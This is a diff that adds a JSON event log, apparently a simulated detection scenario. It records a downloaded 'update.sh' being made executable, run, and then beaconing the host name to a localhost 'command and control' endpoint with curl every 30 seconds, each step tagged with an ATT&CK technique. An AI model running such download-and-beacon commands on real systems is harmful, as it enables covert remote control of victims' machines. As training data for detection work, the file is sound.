@@ -1,0 +1,115 @@
+{
+  "scenario": "Suspicious File Download Activity",
+  "host": "bunny-VirtualBox",
+  "user": "bunny",
+  "events": [
+    {
+      "timestamp": "2026-06-05T17:37:08Z",
+      "event_type": "process_creation",
+      "process_name": "ftp",
+      "image": "/usr/bin/ftp",
+      "command_line": "ftp 127.0.0.1",
+      "pid": 14401,
+      "parent_pid": 11818,
+      "user": "bunny",
+      "technique": "T1105",
+      "description": "Remote file retrieval initiated"
+    },
+    {
+      "timestamp": "2026-06-05T17:44:39Z",
+      "event_type": "process_creation",
+      "process_name": "chmod",
+      "image": "/usr/bin/chmod",
+      "command_line": "chmod +x update.sh",
+      "pid": 14785,
+      "parent_pid": 11818,
+      "user": "bunny",
+      "technique": "T1059",
+      "description": "Executable permission assigned to downloaded file"
+    },
+    {
+      "timestamp": "2026-06-05T17:46:14Z",
+      "event_type": "process_creation",
+      "process_name": "bash",
+      "image": "/usr/bin/bash",
+      "command_line": "/bin/bash ./update.sh",
+      "pid": 14811,
+      "parent_pid": 11818,
+      "user": "bunny",
+      "technique": "T1059",
+      "description": "Downloaded payload executed"
+    },
+    {
+      "timestamp": "2026-06-05T17:46:14Z",
+      "event_type": "process_creation",
+      "process_name": "hostname",
+      "image": "/usr/bin/hostname",
+      "command_line": "hostname",
+      "pid": 14812,
+      "parent_pid": 14811,
+      "user": "bunny",
+      "technique": "T1082",
+      "description": "Host discovery performed by payload"
+    },
+    {
+      "timestamp": "2026-06-05T17:46:14Z",
+      "event_type": "process_creation",
+      "process_name": "curl",
+      "image": "/usr/bin/curl",
+      "command_line": "curl -s http://127.0.0.1:8080/heartbeat?host=bunny-VirtualBox",
+      "pid": 14813,
+      "parent_pid": 14811,
+      "user": "bunny",
+      "technique": "T1071",
+      "description": "Initial callback to command and control endpoint"
+    },
+    {
+      "timestamp": "2026-06-05T17:46:14Z",
+      "event_type": "process_creation",
+      "process_name": "sleep",
+      "image": "/usr/bin/sleep",
+      "command_line": "sleep 30",
+      "pid": 14815,
+      "parent_pid": 14811,
+      "user": "bunny",
+      "technique": "T1071",
+      "description": "Beacon interval delay"
+    },
+    {
+      "timestamp": "2026-06-05T17:46:44Z",
+      "event_type": "process_creation",
+      "process_name": "hostname",
+      "image": "/usr/bin/hostname",
+      "command_line": "hostname",
+      "pid": 14822,
+      "parent_pid": 14811,
+      "user": "bunny",
+      "technique": "T1082",
+      "description": "Repeated host identification"
+    },
+    {
+      "timestamp": "2026-06-05T17:46:44Z",
+      "event_type": "process_creation",
+      "process_name": "curl",
+      "image": "/usr/bin/curl",
+      "command_line": "curl -s http://127.0.0.1:8080/heartbeat?host=bunny-VirtualBox",
+      "pid": 14823,
+      "parent_pid": 14811,
+      "user": "bunny",
+      "technique": "T1071",
+      "description": "Repeated beacon callback"
+    },
+    {
+      "timestamp": "2026-06-05T17:46:44Z",
+      "event_type": "process_creation",
+      "process_name": "sleep",
+      "image": "/usr/bin/sleep",
+      "command_line": "sleep 30",
+      "pid": 14825,
+      "parent_pid": 14811,
+      "user": "bunny",
+      "technique": "T1071",
+      "description": "Beacon interval delay"
+    }
+  ]
+}
